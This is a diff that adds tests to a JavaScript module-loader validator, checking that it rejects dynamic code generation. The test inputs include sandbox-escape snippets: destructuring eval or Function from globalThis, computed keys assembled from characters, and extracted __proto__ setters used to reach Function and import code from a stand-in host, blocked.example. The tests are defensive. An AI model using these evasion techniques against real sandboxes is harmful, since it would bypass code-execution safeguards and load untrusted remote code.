@@ -575,6 +575,39 @@ describe("routing/api/module-loader/http-validator", () => {
       }
     });
 
+    it("should allow safe local object destructuring of generator-like keys", async () => {
+      await validateHTTPImports(
+        `const source = { constructor: "ordinary", eval: "text", Function: "name" };` +
+          ` const { constructor: ctor, eval: run, Function: make } = source;` +
+          ` export const GET = () => new Response(String(ctor + run + make));`,
+        [],
+      );
+      await validateHTTPImports(
+        `const source = { constructor: "ordinary" }; const key = "constructor";` +
+          ` const { [key]: value } = source;` +
+          ` export const GET = () => new Response(String(value));`,
+        [],
+      );
+    });
+
+    it("should reject dangerous destructuring from the global object", async () => {
+      for (
+        const source of [
+          `const { eval: run } = globalThis; run(payload);`,
+          `const { Function: Make } = globalThis.valueOf(); Make(payload)();`,
+          `let Make; ({ constructor: Make } = globalThis?.valueOf()); Make(payload)();`,
+          `const key = ["e", "v", "a", "l"].join(""); let run; ({ [key]: run } = globalThis); run(payload);`,
+        ]
+      ) {
+        await assertRejects(
+          async () => await validateHTTPImports(source, []),
+          Error,
+          "dynamic code generation",
+          "global-object destructuring can expose eval, Function, constructor, or an unknown computed key",
+        );
+      }
+    });
+
     it("should reject constructor reads from object literals with a custom prototype", async () => {
       await assertRejects(
         async () =>
@@ -648,6 +681,45 @@ describe("routing/api/module-loader/http-validator", () => {
         Error,
         "dynamic code generation",
         "an unresolved assignment key may invoke the inherited __proto__ setter",
+      );
+      await assertRejects(
+        async () =>
+          await validateHTTPImports(
+            `const setter = Object.getOwnPropertyDescriptor(Object.prototype, "__proto__").set;` +
+              ` const holder = {}; setter.call(holder, () => {});` +
+              ` const make = holder.constructor;` +
+              ` make('return import("https://blocked.example/mod.js")')();`,
+            [],
+          ),
+        Error,
+        "dynamic code generation",
+        "an extracted Object.prototype.__proto__ setter can mutate the holder through call",
+      );
+      await assertRejects(
+        async () =>
+          await validateHTTPImports(
+            `const setter = Reflect.getOwnPropertyDescriptor(Object.prototype, "__proto__").set;` +
+              ` const holder = {}; Reflect.apply(setter, holder, [() => {}]);` +
+              ` const make = holder.constructor;` +
+              ` make('return import("https://blocked.example/mod.js")')();`,
+            [],
+          ),
+        Error,
+        "dynamic code generation",
+        "Reflect.apply on an extracted __proto__ setter can mutate the holder",
+      );
+      await validateHTTPImports(
+        `const source = { __proto__: () => {} };` +
+          ` const holder = {}; Object.assign(holder, source);` +
+          ` const make = holder.constructor;` +
+          ` export const GET = () => new Response(String(make));`,
+        [],
+      );
+      await validateHTTPImports(
+        `const holder = { ["__proto__"]: () => {} };` +
+          ` const make = holder.constructor;` +
+          ` export const GET = () => new Response(String(make));`,
+        [],
       );
     });
 
